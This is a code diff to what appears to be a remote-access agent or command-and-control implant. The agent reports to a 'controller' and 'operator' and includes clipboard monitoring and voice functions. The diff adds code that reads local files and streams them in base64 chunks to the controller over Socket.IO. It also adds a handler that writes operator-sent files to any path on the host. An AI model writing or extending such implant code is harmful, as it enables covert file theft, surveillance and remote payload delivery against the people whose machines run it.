@@ -72,6 +72,7 @@ import asyncio
 import platform
 from collections import defaultdict
 import queue
+import math
 
 # Suppress SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -3313,54 +3314,86 @@ def stop_clipboard_monitor():
 
 # --- File Management Functions ---
 
+def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
+    """Send a file to the controller in chunks using Socket.IO."""
+    if not os.path.exists(file_path):
+        return f"File not found: {file_path}"
+    chunk_size = 512 * 1024  # 512KB
+    filename = os.path.basename(file_path)
+    total_size = os.path.getsize(file_path)
+    with open(file_path, 'rb') as f:
+        offset = 0
+        while True:
+            chunk = f.read(chunk_size)
+            if not chunk:
+                break
+            chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
+            sio.emit('file_chunk_from_agent', {
+                'agent_id': agent_id,
+                'filename': filename,
+                'chunk': chunk_b64,
+                'offset': offset,
+                'total_size': total_size,
+                'destination_path': destination_path or file_path
+            })
+            offset += len(chunk)
+    # Notify upload complete
+    sio.emit('upload_file_end', {
+        'agent_id': agent_id,
+        'filename': filename,
+        'destination_path': destination_path or file_path
+    })
+    return f"File {file_path} sent to controller in chunks"
+
 def handle_file_upload(command_parts):
-    """Handle file upload from controller."""
-    try:
-        if len(command_parts) < 3:
-            return "Invalid upload command format"
-        
-        destination_path = command_parts[1]
-        file_content_b64 = command_parts[2]
-        
-        # Decode base64 content
-        file_content = base64.b64decode(file_content_b64)
-        
-        # Ensure directory exists
-        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
-        
-        # Write file
-        with open(destination_path, 'wb') as f:
-            f.write(file_content)
-        
-        return f"File uploaded successfully to {destination_path}"
-    except Exception as e:
-        return f"File upload failed: {e}"
+    """Handle file upload from controller (deprecated, now uses chunked)."""
+    return "File upload via HTTP POST is deprecated. Use chunked Socket.IO upload."
 
 def handle_file_download(command_parts, agent_id):
-    """Handle file download request from controller."""
-    try:
-        if len(command_parts) < 2:
-            return "Invalid download command format"
-        
-        file_path = command_parts[1]
-        
-        if not os.path.exists(file_path):
-            return f"File not found: {file_path}"
-        
-        # Read file and encode as base64
-        with open(file_path, 'rb') as f:
-            file_content = base64.b64encode(f.read()).decode('utf-8')
-        
-        # Send file to controller
-        filename = os.path.basename(file_path)
-        url = f"{SERVER_URL}/file_upload/{agent_id}"
-        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
-        
-        return f"File {file_path} sent to controller"
-    except Exception as e:
-        return f"File download failed: {e}"
+    """Handle file download request from controller (deprecated, now uses chunked)."""
+    return "File download via HTTP POST is deprecated. Use chunked Socket.IO download."
 
-# --- Voice Communication Functions ---
+# --- Socket.IO File Transfer Handlers ---
+
+@sio.on('file_chunk_from_operator')
+def on_file_chunk_from_operator(data):
+    """Receive a file chunk from the operator and write to disk."""
+    filename = data.get('filename')
+    chunk_b64 = data.get('data') or data.get('chunk')
+    offset = data.get('offset', 0)
+    total_size = data.get('total_size', 0)
+    destination_path = data.get('destination_path') or filename
+    if not filename or not chunk_b64:
+        print("Invalid file chunk received.")
+        return
+    # Use a temp buffer in memory or on disk
+    if not hasattr(on_file_chunk_from_operator, 'buffers'):
+        on_file_chunk_from_operator.buffers = {}
+    buffers = on_file_chunk_from_operator.buffers
+    if destination_path not in buffers:
+        buffers[destination_path] = {'chunks': [], 'total_size': total_size}
+    # Remove data: prefix if present
+    if ',' in chunk_b64:
+        chunk_b64 = chunk_b64.split(',', 1)[1]
+    chunk = base64.b64decode(chunk_b64)
+    buffers[destination_path]['chunks'].append((offset, chunk))
+    # Check if file is complete
+    received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
+    if total_size and received_size >= total_size:
+        # Sort by offset and write to disk
+        buffers[destination_path]['chunks'].sort()
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        with open(destination_path, 'wb') as f:
+            for _, c in buffers[destination_path]['chunks']:
+                f.write(c)
+        print(f"File downloaded successfully to {destination_path}")
+        del buffers[destination_path]
+
+@sio.on('file_upload_complete_from_operator')
+def on_file_upload_complete_from_operator(data):
+    filename = data.get('filename')
+    destination_path = data.get('destination_path') or filename
+    print(f"Upload of {filename} to {destination_path} complete.")
 
 def handle_voice_playback(command_parts):
     """Handle voice playback from controller."""
